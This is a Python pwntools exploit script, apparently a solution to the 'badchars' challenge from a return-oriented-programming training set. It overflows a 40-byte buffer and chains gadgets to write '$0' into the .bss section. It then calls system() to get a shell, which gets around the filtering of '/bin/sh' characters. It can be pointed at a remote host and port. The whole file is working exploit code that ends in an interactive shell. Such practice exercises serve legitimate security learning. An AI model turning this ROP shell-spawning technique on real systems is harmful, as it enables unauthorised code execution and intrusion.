#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './badchars'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# gadget
prdi = 0x400b39 
p1213 = 0x400b3b
m1213 = 0x400b34
system = 0x04009E8
p1415 = 0x400b40
x1415 = 0x400b30

'''
   0x400b30 <usefulGadgets>:    xor    BYTE PTR [r15],r14b
   0x400b33 <usefulGadgets+3>:  ret    
   0x400b34 <usefulGadgets+4>:  mov    QWORD PTR [r13+0x0],r12
   0x400b38 <usefulGadgets+8>:  ret    
   0x400b39 <usefulGadgets+9>:  pop    rdi
=> 0x400b3a <usefulGadgets+10>: ret    
   0x400b3b <usefulGadgets+11>: pop    r12
   0x400b3d <usefulGadgets+13>: pop    r13
   0x400b3f <usefulGadgets+15>: ret    
   0x400b40 <usefulGadgets+16>: pop    r14
   0x400b42 <usefulGadgets+18>: pop    r15
   0x400b44 <usefulGadgets+20>: ret   
'''

# rop1
offset = 40
payload = 'A'*offset
# filtered: bic/ fns
# $0 is okay, but use gadget x1415 to get /bin/sh via xor is the goal (too lazy to write exp) 
payload += p64(p1213) + '$0\0\0\0\0\0\0' + p64(elf.bss()+0x400) + p64(m1213) 
payload += p64(prdi) + p64(elf.bss()+0x400) + p64(system)

# debug()
sl(payload)

p.interactive()